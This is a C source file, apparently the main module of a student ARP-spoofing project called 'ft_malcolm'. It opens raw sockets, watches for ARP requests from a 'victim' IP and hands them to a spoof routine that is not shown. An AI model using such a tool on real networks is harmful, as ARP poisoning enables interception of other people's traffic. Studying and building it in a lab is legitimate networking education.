//
// Created by loumouli on 12/13/23.
//

#include "ft_malcolm.h"

char stop = true;

void sig_handler(const int sig) {
  if (sig == SIGINT) {
    stop = false;
  }
}

static void interface_setup(t_malcolm* malcolm) {
  struct ifaddrs* ifaddr = NULL;
  const struct ifaddrs* ifa = NULL;

  if (getifaddrs(&ifaddr) == -1)
    error("getifaddrs", NULL, __FILE__, __LINE__, __func__);

  for (ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
    if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_PACKET)
      continue;
    if (ft_strcmp(ifa->ifa_name, INTERFACE_NAME) == 0) {
      malcolm->index = if_nametoindex(INTERFACE_NAME);
      if (!malcolm->index)
        error("if_nametoindex", NULL, __FILE__, __LINE__, __func__);
    }
  }
  ifa = ifaddr;
  while (ifa && ((struct sockaddr_ll*)ifa->ifa_addr)->sll_ifindex != (int)malcolm->index)
    ifa = ifa->ifa_next;
  if (ifa == NULL)
    error("Cant find valid MAC address for interface", NULL, __FILE__, __LINE__, __func__);
  ft_memcpy(malcolm->brd_addr, ((struct sockaddr_ll*)ifa->ifa_addr)->sll_addr, 6); // copying broadcast address
  freeifaddrs(ifaddr);
}

static void init_inqui(t_malcolm* malcolm, char** av) {
  malcolm->ip_src = (uint8_t*)av[1];
  malcolm->mac_src = (uint8_t*)av[2];
  malcolm->ip_target = (uint8_t*)av[3];
  malcolm->mac_target = (uint8_t*)av[4];
  malcolm->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); // create a raw socket to send arp reply
  if (malcolm->sock == -1)
    error("socket", NULL, __FILE__, __LINE__, __func__);
  interface_setup(malcolm);
  malcolm->ifr.ifr_addr.sa_family = AF_INET; // we want ipv4 family
  ft_strlcpy(malcolm->ifr.ifr_name, INTERFACE_NAME, ft_strlen(INTERFACE_NAME) + 1); // coppying interface name
  mac_str_to_hex(malcolm->mac_src, malcolm->mac_src_byte_arr); // convert mac_source to bytes array
  mac_str_to_hex(malcolm->mac_target, malcolm->mac_target_byte_arr); // convert mac_target to bytes array
  if (inet_pton(AF_INET, (char*)malcolm->ip_src, malcolm->ip_src_byte_arr) != 1) // convert ip_src to bytes array
    error("inet_pton", "Error convertion ip address source", __FILE__, __LINE__, __func__);
  if (inet_pton(AF_INET, (char*)malcolm->ip_target, malcolm->ip_target_byte_arr) !=
      1) // convert ip_target to bytes array
    error("inet_pton", "Error convertion ip address victim", __FILE__, __LINE__, __func__);
  malcolm->sock_broad = socket(AF_PACKET, SOCK_RAW | SOCK_NONBLOCK, htons(ETH_P_ALL));
  // create raw non blocking socket that will accept every packet
  if (malcolm->sock_broad == -1)
    error("socket", NULL, __FILE__, __LINE__, __func__);
}

static uint32_t listen_broad(const t_malcolm* malcolm, ethernet_frame* pot_eth_frame) {
  char buff[15000];
  const int retval = recvfrom(malcolm->sock_broad, buff, sizeof(buff), 0, NULL, NULL);
  if (retval == -1) {
    if (errno == EAGAIN || errno == EWOULDBLOCK)
      return 1;
    error("recvfrom", NULL, __FILE__, __LINE__, __func__);
  }
  dprintf(1, GREEN "LOG:\t\tPACKET RECEIVED\n" RESET);
  const ethernet_frame* eth = (ethernet_frame*)buff;
  if (ntohs(*(uint16_t*)eth->ethertype) != ETH_P_ARP) {
    dprintf(1, YELLOW "WARNING:\tNOT AN ARP PACKET\n" RESET);
    return 2;
  }
  const t_packet* packet = (t_packet*)eth->data;
  dprintf(1, GREEN "LOG:\t\tARP PACKET\n" RESET);
#ifdef VERBOSE
  dprintf(1, GREEN);
  dprintf(1, "LOG:\t\tEthernet frame:\n\n");
  print_ethernet_frame(eth);
  dprintf(1, "\nLOG:\t\tARP packet:\n\n");
  print_arp_packet(packet);
  dprintf(1, "\n" RESET);
#endif
  if (ft_memcmp(packet->ar_sip, malcolm->ip_target_byte_arr, 4) != 0) {
    dprintf(1, YELLOW "WARNING:\tNOT COMMING FROM THE TARGET\n" RESET);
    return 3;
  }
  dprintf(1, GREEN "LOG:\t\tPACKET IS FROM TARGET\n" RESET);
  if (ft_memcmp(packet->ar_tip, malcolm->ip_src_byte_arr, 4) != 0) {
    dprintf(1, YELLOW "WARNING:\t PAKCET NOT TARGEING THE SOURCE\n");
    return 4;
  }
  dprintf(1, GREEN "LOG:\t\tPACKET IS TARGETING SOURCE\n" RESET);
  ft_memcpy(pot_eth_frame, eth, sizeof(ethernet_frame));
  return 0;
}

int main(const int ac, char** av) {
  t_malcolm malcolm;
  if (ac != 5)
    error("main", "usage: ./ft_malcolm <ip_src> <mac_src> <ip_target> <mac_target>", __FILE__, __LINE__, __func__);
  init_inqui(&malcolm, av);
  signal(SIGINT, sig_handler);
  while (stop) {
    ethernet_frame pot_packet = {0};
    if (listen_broad(&malcolm, &pot_packet) == 0) {
      spoof_back_request(&malcolm, &pot_packet);
      dprintf(1, "My job here is done.\n");
      break;
    }
  }
  close(malcolm.sock);
  close(malcolm.sock_broad);
  return 0;
}
